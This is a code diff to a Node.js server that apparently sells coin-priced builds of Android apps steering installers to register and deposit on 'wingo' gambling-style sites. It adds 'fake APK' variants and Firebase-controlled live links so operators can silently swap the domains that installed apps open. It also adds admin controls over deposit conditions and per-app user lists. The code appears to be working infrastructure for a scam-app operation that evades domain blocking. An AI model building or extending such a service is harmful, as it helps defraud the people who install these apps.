@@ -6,11 +6,19 @@ const multer = require('multer');
 const path = require('path');
 const fs = require('fs');
 const bcrypt = require('bcryptjs');
-const { v4: uuidv4 } = require('uuid');
 
 const db = require('./database/db');
 const { buildApk, makePackageName } = require('./utils/apkbuilder');
 const { initBot, sendCoinRequest, sendApkReady } = require('./utils/telegram');
+const {
+  normalizeHttpUrl,
+  replaceUrlDomain,
+  updateFirebaseLinks,
+  getFirebaseControl,
+  updateFirebaseControl,
+  addFirebaseUser,
+  removeFirebaseUser
+} = require('./utils/runtime-links');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -129,9 +137,10 @@ const designPreviewImagesStmt = db.prepare(`
 
 function normalizeDesignCategory(value, design = {}) {
   const category = String(value || '').trim().toLowerCase();
-  if (['zayro', 'dhani', 'java'].includes(category)) return category;
+  if (category === 'dhani') return 'dhani';
   const legacyType = String(design.java_type || '').trim().toLowerCase();
   if (legacyType === 'dhani' || legacyType === 'premium' || /dhani/i.test(design.name || '')) return 'dhani';
+  // Old "normal" and "java" categories are both the common Zayro Java.
   return 'zayro';
 }
 
@@ -170,6 +179,15 @@ app.post('/api/order', requireAuth, iconUpload.single('icon'), async (req, res) 
   const { design_id, app_name, register_url, min_deposit, brand_title, fake_addon, fake_register_url } = req.body;
   if (!design_id || !app_name || !register_url) return res.json({ error: 'Missing required fields' });
 
+  let cleanRegisterUrl;
+  let cleanFakeRegisterUrl = null;
+  try {
+    cleanRegisterUrl = normalizeHttpUrl(register_url);
+    if (fake_register_url) cleanFakeRegisterUrl = normalizeHttpUrl(fake_register_url);
+  } catch (error) {
+    return res.json({ error: error.message || 'Enter a valid http(s) register URL' });
+  }
+
   const design = db.prepare('SELECT * FROM designs WHERE id=? AND active=1').get(design_id);
   if (!design) return res.json({ error: 'Design not found' });
 
@@ -180,13 +198,34 @@ app.post('/api/order', requireAuth, iconUpload.single('icon'), async (req, res) 
   const fakePrice = design.fake_price_coins > 0 ? design.fake_price_coins : parseInt(db.prepare('SELECT value FROM settings WHERE key=?').get('addon_fake_price')?.value || '5');
   const totalCoins = design.price_coins + (fakeAddonEnabled ? fakePrice : 0);
 
-  if (fakeAddonEnabled && !fake_register_url) return res.json({ error: 'Fake site register URL required' });
+  if (fakeAddonEnabled && !cleanFakeRegisterUrl) return res.json({ error: 'Fake site register URL required' });
   if (user.coins < totalCoins) return res.json({ error: `Not enough coins. Need ${totalCoins}, have ${user.coins}` });
 
   const { buildUrls, extractDomain } = require('./utils/htmlprocessor');
-  const { deposit: depositUrl, wingo: wingoUrl } = buildUrls(register_url);
-  const domain = extractDomain(register_url);
+  const { deposit: depositUrl, wingo: wingoUrl } = buildUrls(cleanRegisterUrl);
+  const domain = extractDomain(cleanRegisterUrl);
   const firebasePath = `zayro${domain.replace(/[^a-z0-9]/gi, '').substring(0, 10)}`;
+  let fakeFirebasePath = null;
+
+  try {
+    await updateFirebaseLinks(firebasePath, {
+      registerUrl: cleanRegisterUrl,
+      depositUrl,
+      wingoUrl
+    });
+    if (fakeAddonEnabled && cleanFakeRegisterUrl) {
+      const fakeDomain = extractDomain(cleanFakeRegisterUrl);
+      const fakeUrls = buildUrls(cleanFakeRegisterUrl);
+      fakeFirebasePath = `zayrof${fakeDomain.replace(/[^a-z0-9]/gi,'').substring(0,8)}`;
+      await updateFirebaseLinks(fakeFirebasePath, {
+        registerUrl: cleanFakeRegisterUrl,
+        depositUrl: fakeUrls.deposit,
+        wingoUrl: fakeUrls.wingo
+      });
+    }
+  } catch (error) {
+    return res.json({ error: `${error.message}. APK was not started and no coins were deducted.` });
+  }
 
   _pkgCounter++;
   const packageName = makePackageName(app_name, _pkgCounter);
@@ -195,9 +234,9 @@ app.post('/api/order', requireAuth, iconUpload.single('icon'), async (req, res) 
   db.prepare('UPDATE users SET coins = coins - ? WHERE id=?').run(totalCoins, user.id);
 
   const orderResult = db.prepare(`
-    INSERT INTO orders(user_id,design_id,app_name,package_name,register_url,deposit_url,wingo_url,domain,firebase_path,min_deposit,brand_title,icon_file,fake_register_url,status,coins_spent,design_variant)
-    VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,'building',?,?)
-  `).run(user.id, design_id, app_name.trim(), packageName, register_url.trim(), depositUrl, wingoUrl, domain, firebasePath, parseInt(min_deposit)||300, brand_title?.trim()||app_name.trim(), iconFile, fakeAddonEnabled ? fake_register_url.trim() : null, totalCoins, 'real');
+    INSERT INTO orders(user_id,design_id,app_name,package_name,register_url,deposit_url,wingo_url,domain,firebase_path,min_deposit,brand_title,icon_file,fake_register_url,fake_firebase_path,live_link_enabled,status,coins_spent,design_variant)
+    VALUES(?,?,?,?,?,?,?,?,?,?,?,?,?,?,1,'building',?,?)
+  `).run(user.id, design_id, app_name.trim(), packageName, cleanRegisterUrl, depositUrl, wingoUrl, domain, firebasePath, parseInt(min_deposit)||300, brand_title?.trim()||app_name.trim(), iconFile, fakeAddonEnabled ? cleanFakeRegisterUrl : null, fakeFirebasePath, totalCoins, 'real');
 
   const orderId = orderResult.lastInsertRowid;
   const buildId = `build_${orderId}_${Date.now()}`;
@@ -215,18 +254,19 @@ app.post('/api/order', requireAuth, iconUpload.single('icon'), async (req, res) 
 
       let fakeResult = null;
       // ── Fake APK build if addon enabled ──
-      if (fakeAddonEnabled && fake_register_url) {
+      if (fakeAddonEnabled && cleanFakeRegisterUrl) {
         logPush('\n--- Building Fake APK ---');
         const fakeOrder = {
           ...order,
           is_fake: true,
           app_name: order.app_name + ' Fake',
           package_name: 'com.zayrof.' + packageName.split('.').pop(),
-          register_url: fake_register_url.trim(),
-          deposit_url: buildUrls(fake_register_url.trim()).deposit,
-          wingo_url: buildUrls(fake_register_url.trim()).wingo,
-          domain: extractDomain(fake_register_url.trim()),
-          firebase_path: `zayrof${extractDomain(fake_register_url.trim()).replace(/[^a-z0-9]/gi,'').substring(0,8)}`
+          register_url: cleanFakeRegisterUrl,
+          deposit_url: buildUrls(cleanFakeRegisterUrl).deposit,
+          wingo_url: buildUrls(cleanFakeRegisterUrl).wingo,
+          domain: extractDomain(cleanFakeRegisterUrl),
+          firebase_path: order.fake_firebase_path
+            || `zayrof${extractDomain(cleanFakeRegisterUrl).replace(/[^a-z0-9]/gi,'').substring(0,8)}`
         };
         const fakeBuildId = buildId + '_fake';
         fakeResult = await buildApk(fakeOrder, design, fakeBuildId, logPush);
@@ -255,7 +295,9 @@ app.post('/api/order', requireAuth, iconUpload.single('icon'), async (req, res) 
 
 app.get('/api/orders', requireAuth, (req, res) => {
   const orders = db.prepare(`
-    SELECT o.id,o.app_name,o.package_name,o.status,o.apk_file,o.fake_apk_file,o.coins_spent,o.created_at,d.name as design_name
+    SELECT o.id,o.app_name,o.package_name,o.status,o.apk_file,o.fake_apk_file,o.coins_spent,o.created_at,
+           CASE WHEN o.live_link_enabled=1 THEN 1 ELSE 0 END AS live_link_enabled,
+           d.name as design_name
     FROM orders o JOIN designs d ON o.design_id=d.id
     WHERE o.user_id=? ORDER BY o.id DESC
   `).all(req.session.userId);
@@ -294,50 +336,162 @@ app.get('/api/orders/:id/download-fake', requireAuth, (req, res) => {
   res.download(apkPath, o.fake_apk_file);
 });
 
-// Domain change
+// Firebase live-link update. New APKs read URL fields from the same
+// <firebase_path>/config node that already controls deposit/register conditions,
+// so the APK never depends on this builder server while running.
 app.post('/api/orders/:id/change-domain', requireAuth, async (req, res) => {
-  const { new_register_url } = req.body;
-  if (!new_register_url) return res.json({ error: 'New URL required' });
+  if (!req.body.new_register_url) return res.json({ error: 'New URL required' });
 
+  const changeType = req.body.change_type === 'invite' ? 'invite' : 'domain';
   const order = db.prepare('SELECT * FROM orders WHERE id=? AND user_id=?').get(req.params.id, req.session.userId);
   if (!order) return res.status(404).json({ error: 'Order not found' });
   if (order.status !== 'done') return res.json({ error: 'Order must be completed first' });
 
-  const price = parseInt(db.prepare('SELECT value FROM settings WHERE key=?').get('domain_change_price')?.value || '10');
+  let newRegisterUrl;
+  try {
+    newRegisterUrl = changeType === 'domain'
+      ? replaceUrlDomain(order.register_url, req.body.new_register_url)
+      : normalizeHttpUrl(req.body.new_register_url);
+  } catch (error) {
+    return res.json({ error: error.message || 'Enter a valid http(s) URL' });
+  }
+
+  const priceKey = changeType === 'domain' ? 'domain_change_price' : 'invite_code_change_price';
+  const price = parseInt(db.prepare('SELECT value FROM settings WHERE key=?').get(priceKey)?.value || '10');
+  const countField = changeType === 'domain' ? 'domain_change_count' : 'invite_code_change_count';
   const user = db.prepare('SELECT * FROM users WHERE id=?').get(req.session.userId);
   if (!user) return res.json({ error: 'User not found' });
-  if (user.coins < price) return res.json({ error: `Not enough coins. Need ${price}, have ${user.coins}` });
 
   const { buildUrls, extractDomain } = require('./utils/htmlprocessor');
-  const { deposit: depositUrl, wingo: wingoUrl } = buildUrls(new_register_url.trim());
-  const domain = extractDomain(new_register_url.trim());
-  const firebasePath = `zayro${domain.replace(/[^a-z0-9]/gi,'').substring(0,10)}`;
+  const { deposit: depositUrl, wingo: wingoUrl } = buildUrls(newRegisterUrl);
+  const domain = extractDomain(newRegisterUrl);
+  const newLinks = { registerUrl: newRegisterUrl, depositUrl, wingoUrl };
+  const oldLinks = {
+    registerUrl: order.register_url,
+    depositUrl: order.deposit_url,
+    wingoUrl: order.wingo_url
+  };
 
-  db.prepare('UPDATE users SET coins = coins - ? WHERE id=?').run(price, user.id);
-  db.prepare('UPDATE orders SET register_url=?,deposit_url=?,wingo_url=?,domain=?,firebase_path=?,status=?,apk_file=NULL,build_log=?,domain_change_count=domain_change_count+1 WHERE id=?')
-    .run(new_register_url.trim(), depositUrl, wingoUrl, domain, firebasePath, 'building', 'Domain change initiated...', order.id);
+  const chargeUser = () => {
+    const charged = db.prepare('UPDATE users SET coins=coins-? WHERE id=? AND coins>=?')
+      .run(price, user.id, price);
+    if (!charged.changes) throw new Error(`Not enough coins. Need ${price}, have ${user.coins}`);
+  };
+  const refundUser = () => db.prepare('UPDATE users SET coins=coins+? WHERE id=?').run(price, user.id);
 
-  const buildId = `build_${order.id}_dc_${Date.now()}`;
+  try {
+    chargeUser();
+  } catch (error) {
+    return res.json({ error: error.message });
+  }
+
+  try {
+    await updateFirebaseLinks(order.firebase_path, newLinks);
+  } catch (error) {
+    refundUser();
+    return res.json({ error: `${error.message}. Coins were refunded.` });
+  }
+
+  // Modern APK: Firebase has the new links; only mirror them in SQLite for the
+  // dashboard. The APK file, status and installed app remain untouched.
+  if (order.live_link_enabled === 1) {
+    try {
+      db.prepare(`
+        UPDATE orders SET register_url=?,deposit_url=?,wingo_url=?,domain=?,
+          build_log=?,${countField}=COALESCE(${countField},0)+1
+        WHERE id=?
+      `).run(
+        newRegisterUrl, depositUrl, wingoUrl, domain,
+        `Firebase ${changeType} link updated at ${new Date().toISOString()}`,
+        order.id
+      );
+    } catch (error) {
+      refundUser();
+      try { await updateFirebaseLinks(order.firebase_path, oldLinks); } catch (_) {}
+      return res.json({ error: `${error.message}. Coins were refunded.` });
+    }
+
+    return res.json({
+      success: true,
+      mode: 'instant',
+      orderId: order.id,
+      changeType,
+      message: changeType === 'domain'
+        ? 'Firebase domain updated. Invitation code was kept unchanged.'
+        : 'Firebase register URL and invitation code updated.'
+    });
+  }
+
+  // APKs built before this injected Firebase listener need one final upgrade.
+  // Afterwards every update uses Firebase only and is instant.
+  const buildId = `build_${order.id}_firebase_${Date.now()}`;
+  try {
+    db.prepare(`
+      UPDATE orders SET register_url=?,deposit_url=?,wingo_url=?,domain=?,
+        live_link_enabled=1,status='building',apk_file=NULL,build_log=?,
+        ${countField}=COALESCE(${countField},0)+1
+      WHERE id=?
+    `).run(
+      newRegisterUrl, depositUrl, wingoUrl, domain,
+      `One-time Firebase ${changeType} link upgrade started...`, order.id
+    );
+  } catch (error) {
+    refundUser();
+    try { await updateFirebaseLinks(order.firebase_path, oldLinks); } catch (_) {}
+    return res.json({ error: `${error.message}. Coins were refunded.` });
+  }
+
   const updatedOrder = db.prepare('SELECT * FROM orders WHERE id=?').get(order.id);
   const design = db.prepare('SELECT * FROM designs WHERE id=?').get(order.design_id);
 
-  res.json({ success: true, orderId: order.id, buildId });
+  const restoreOldOrder = async errorMessage => {
+    let firebaseRestoreError = '';
+    try { await updateFirebaseLinks(order.firebase_path, oldLinks); }
+    catch (error) { firebaseRestoreError = `; Firebase restore failed: ${error.message}`; }
+    db.transaction(() => {
+      refundUser();
+      db.prepare(`
+        UPDATE orders SET register_url=?,deposit_url=?,wingo_url=?,domain=?,
+          live_link_enabled=0,status='done',apk_file=?,build_log=?,
+          domain_change_count=?,invite_code_change_count=?
+        WHERE id=?
+      `).run(
+        order.register_url, order.deposit_url, order.wingo_url, order.domain,
+        order.apk_file, `Live-link upgrade failed: ${errorMessage}${firebaseRestoreError}`,
+        order.domain_change_count || 0, order.invite_code_change_count || 0, order.id
+      );
+    })();
+  };
 
-  const logs = ['Domain change initiated...'];
-  const logPush = (msg) => { logs.push(msg); db.prepare('UPDATE orders SET build_log=? WHERE id=?').run(logs.join('\n'), order.id); };
+  if (!design) {
+    await restoreOldOrder('design not found');
+    return res.json({ error: 'Design not found; coins were refunded' });
+  }
+
+  res.json({
+    success: true,
+    mode: 'upgrade',
+    orderId: order.id,
+    buildId,
+    changeType,
+    message: 'This old APK needs one final Firebase upgrade. Future link changes will be instant.'
+  });
+
+  const logs = [`One-time Firebase ${changeType} link upgrade started...`];
+  const logPush = message => {
+    logs.push(message);
+    db.prepare('UPDATE orders SET build_log=? WHERE id=?').run(logs.join('\n'), order.id);
+  };
+
   buildApk(updatedOrder, design, buildId, logPush).then(async result => {
     if (result.success) {
-      db.prepare('UPDATE orders SET apk_file=?,status=? WHERE id=?').run(result.apkFile, 'done', order.id);
-      // Send APK file via Telegram (instant)
+      db.prepare('UPDATE orders SET apk_file=?,status=?,build_log=? WHERE id=?')
+        .run(result.apkFile, 'done', logs.concat('Firebase live-link upgrade complete!').join('\n'), order.id);
       sendApkReady(user, db.prepare('SELECT * FROM orders WHERE id=?').get(order.id), [result.apkPath], []).catch(() => {});
     } else {
-      db.prepare('UPDATE orders SET status=? WHERE id=?').run('failed', order.id);
-      db.prepare('UPDATE users SET coins = coins + ? WHERE id=?').run(price, user.id);
+      await restoreOldOrder(result.error || 'Build failed');
     }
-  }).catch(err => {
-    db.prepare('UPDATE orders SET status=?,build_log=? WHERE id=?').run('failed', err.message, order.id);
-    db.prepare('UPDATE users SET coins = coins + ? WHERE id=?').run(price, user.id);
-  });
+  }).catch(error => restoreOldOrder(error.message));
 });
 
 // ═══════════════════════════════════════════
@@ -345,7 +499,7 @@ app.post('/api/orders/:id/change-domain', requireAuth, async (req, res) => {
 // ═══════════════════════════════════════════
 
 app.get('/api/settings/payment', (req, res) => {
-  const s = db.prepare('SELECT key,value FROM settings WHERE key IN (?,?,?,?,?)').all('upi_qr_image','upi_id','coin_rate','addon_fake_price','domain_change_price');
+  const s = db.prepare('SELECT key,value FROM settings WHERE key IN (?,?,?,?,?,?)').all('upi_qr_image','upi_id','coin_rate','addon_fake_price','domain_change_price','invite_code_change_price');
   const result = {};
   s.forEach(r => result[r.key] = r.value);
   res.json(result);
@@ -779,6 +933,146 @@ app.get('/api/admin/users/:id/orders', requireAdmin, (req, res) => {
   res.json({ user, orders, stats });
 });
 
+function getOrderFirebaseTarget(order, variant = 'real') {
+  const { buildUrls, extractDomain } = require('./utils/htmlprocessor');
+  if (variant === 'fake') {
+    if (!order.fake_register_url) throw new Error('This order has no Fake APK');
+    const domain = extractDomain(order.fake_register_url);
+    const firebasePath = order.fake_firebase_path
+      || `zayrof${domain.replace(/[^a-z0-9]/gi, '').substring(0, 8)}`;
+    return {
+      variant: 'fake',
+      firebasePath,
+      registerUrl: order.fake_register_url,
+      urls: buildUrls(order.fake_register_url)
+    };
+  }
+  return {
+    variant: 'real',
+    firebasePath: order.firebase_path,
+    registerUrl: order.register_url,
+    urls: { deposit: order.deposit_url, wingo: order.wingo_url }
+  };
+}
+
+function getAdminOrder(orderId) {
+  return db.prepare(`
+    SELECT o.*,u.username,d.name AS design_name
+    FROM orders o JOIN users u ON u.id=o.user_id JOIN designs d ON d.id=o.design_id
+    WHERE o.id=?
+  `).get(orderId);
+}
+
+// Complete Firebase manager for each APK from Admin > Users > APKs.
+app.get('/api/admin/orders/:id/firebase', requireAdmin, async (req, res) => {
+  const order = getAdminOrder(req.params.id);
+  if (!order) return res.status(404).json({ error: 'Order not found' });
+  try {
+    const target = getOrderFirebaseTarget(order, req.query.variant === 'fake' ? 'fake' : 'real');
+    const state = await getFirebaseControl(target.firebasePath);
+    const users = Object.entries(state.users).map(([key, value]) => ({ key, value }));
+    users.sort((a, b) => a.key.localeCompare(b.key));
+    res.json({
+      order: {
+        id: order.id,
+        app_name: order.app_name,
+        username: order.username,
+        design_name: order.design_name,
+        has_fake: !!order.fake_register_url,
+        live_link_enabled: order.live_link_enabled === 1
+      },
+      variant: target.variant,
+      firebase_path: target.firebasePath,
+      register_url: target.registerUrl,
+      config: {
+        minDeposit: state.config.minDeposit ?? order.min_deposit,
+        depositCondition: state.config.depositCondition ?? true,
+        registerCondition: state.config.registerCondition ?? true,
+        registerUrl: state.config.registerUrl || '',
+        depositUrl: state.config.depositUrl || '',
+        wingoUrl: state.config.wingoUrl || ''
+      },
+      users
+    });
+  } catch (error) {
+    res.status(502).json({ error: error.message });
+  }
+});
+
+app.patch('/api/admin/orders/:id/firebase/link', requireAdmin, async (req, res) => {
+  const order = getAdminOrder(req.params.id);
+  if (!order) return res.status(404).json({ error: 'Order not found' });
+  const variant = req.body.variant === 'fake' ? 'fake' : 'real';
+  const changeType = req.body.change_type === 'invite' ? 'invite' : 'domain';
+  try {
+    const target = getOrderFirebaseTarget(order, variant);
+    const registerUrl = changeType === 'domain'
+      ? replaceUrlDomain(target.registerUrl, req.body.new_register_url)
+      : normalizeHttpUrl(req.body.new_register_url);
+    const { buildUrls, extractDomain } = require('./utils/htmlprocessor');
+    const urls = buildUrls(registerUrl);
+    await updateFirebaseLinks(target.firebasePath, {
+      registerUrl,
+      depositUrl: urls.deposit,
+      wingoUrl: urls.wingo
+    });
+    if (variant === 'fake') {
+      db.prepare('UPDATE orders SET fake_register_url=?,fake_firebase_path=? WHERE id=?')
+        .run(registerUrl, target.firebasePath, order.id);
+    } else {
+      db.prepare('UPDATE orders SET register_url=?,deposit_url=?,wingo_url=?,domain=? WHERE id=?')
+        .run(registerUrl, urls.deposit, urls.wingo, extractDomain(registerUrl), order.id);
+    }
+    res.json({ success: true, register_url: registerUrl, change_type: changeType });
+  } catch (error) {
+    res.status(400).json({ error: error.message });
+  }
+});
+
+app.patch('/api/admin/orders/:id/firebase/config', requireAdmin, async (req, res) => {
+  const order = getAdminOrder(req.params.id);
+  if (!order) return res.status(404).json({ error: 'Order not found' });
+  try {
+    const target = getOrderFirebaseTarget(order, req.body.variant === 'fake' ? 'fake' : 'real');
+    const values = {
+      minDeposit: req.body.min_deposit,
+      depositCondition: req.body.deposit_condition === true || req.body.deposit_condition === 'true',
+      registerCondition: req.body.register_condition === true || req.body.register_condition === 'true'
+    };
+    const updated = await updateFirebaseControl(target.firebasePath, values);
+    if (target.variant === 'real' && updated.minDeposit !== undefined) {
+      db.prepare('UPDATE orders SET min_deposit=? WHERE id=?').run(updated.minDeposit, order.id);
+    }
+    res.json({ success: true, config: updated });
+  } catch (error) {
+    res.status(400).json({ error: error.message });
+  }
+});
+
+app.post('/api/admin/orders/:id/firebase/users', requireAdmin, async (req, res) => {
+  const order = getAdminOrder(req.params.id);
+  if (!order) return res.status(404).json({ error: 'Order not found' });
+  try {
+    const target = getOrderFirebaseTarget(order, req.body.variant === 'fake' ? 'fake' : 'real');
+    const user = await addFirebaseUser(target.firebasePath, req.body.user_key);
+    res.json({ success: true, user });
+  } catch (error) {
+    res.status(400).json({ error: error.message });
+  }
+});
+
+app.delete('/api/admin/orders/:id/firebase/users/:userKey', requireAdmin, async (req, res) => {
+  const order = getAdminOrder(req.params.id);
+  if (!order) return res.status(404).json({ error: 'Order not found' });
+  try {
+    const target = getOrderFirebaseTarget(order, req.query.variant === 'fake' ? 'fake' : 'real');
+    const removed = await removeFirebaseUser(target.firebasePath, req.params.userKey);
+    res.json({ success: true, removed });
+  } catch (error) {
+    res.status(400).json({ error: error.message });
+  }
+});
+
 // Get all users with order counts
 app.get('/api/admin/users/stats', requireAdmin, (req, res) => {
   const users = db.prepare(`
@@ -808,7 +1102,7 @@ app.post('/api/admin/settings', requireAdmin, adminUpload.fields([
   { name: 'upi_qr_image', maxCount: 1 },
   { name: 'loading_html', maxCount: 1 }
 ]), (req, res) => {
-  const allowed = ['upi_id','coin_rate','site_name','telegram_bot_token','telegram_admin_id','addon_fake_price','domain_change_price'];
+  const allowed = ['upi_id','coin_rate','site_name','telegram_bot_token','telegram_admin_id','addon_fake_price','domain_change_price','invite_code_change_price'];
   for (const key of allowed) {
     if (req.body[key] !== undefined) {
       db.prepare('INSERT OR REPLACE INTO settings(key,value) VALUES(?,?)').run(key, req.body[key]);
